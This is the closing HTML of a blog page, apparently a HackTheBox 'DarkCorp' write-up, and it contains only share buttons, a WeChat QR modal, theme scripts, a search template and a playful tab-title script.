        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《DarkCorp - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKElEQVR42u3aQW7DMAwEwPz/0ynQU4vAxi7lFI08OgWNnXp8IESuHo94Pb/Xz8+v6/X617uOfuHorosXBgbGxzKep+v1IY54LeD8F/Jnw8DAuA8jL7LtX/Lrj+5KXh8GBgZG+9PrRRYDAwNjpeAm/7JtUDEwMDASRtLEnhfKHJw/+lt6cQwMjA9kzIKBv/n89nwDAwPj3zOe5WpL7WzjWD8VBgbG1oxk03YeTyabwvaARTuqw8DA2JuRH3RYCThXhnTRi8bAwLgBIwkA8kHYDJaU+ygSwMDA2I4xa0cTcBuRXnDsAwMDY1NG3qy247ZZQU8aZgwMjDszWlJSiNv8cRiaYmBgbM2YFcr2qMT66D96iRgYGJsy2tKZN7SzYxZtA4yBgXEfRhtetpHn7NeKsBMDA2NrxlVHH/LHzZvbFoaBgbErIy+Os6MSs3JcHw7DwMDYmjEreW1s0F6zMpjDwMDYj9GO+6+9PrkyKr4YGBhbM/Kxfr5W2tocg4GBcR/GeruYt7JtA1wsDAyMGzDaMdls6JaX8vwVR0ksBgbGhzPaBrUNNZNCn99bbBAxMDA2YlzVoM42jiuDtl/fYmBgbM1YOZ61EmHONn9LSSwGBsaHM9pDD0npbJveWSnHwMC4G+N9I7M2bGjn/xgYGBjrsUG+J81DAgwMDIyWkR+wWC/NhxtHDAyMGzDaRjQfq82S1ToSwMDA2JoxCwbapnSlTCffYmBgbMr4AqR9VuTP9DCdAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
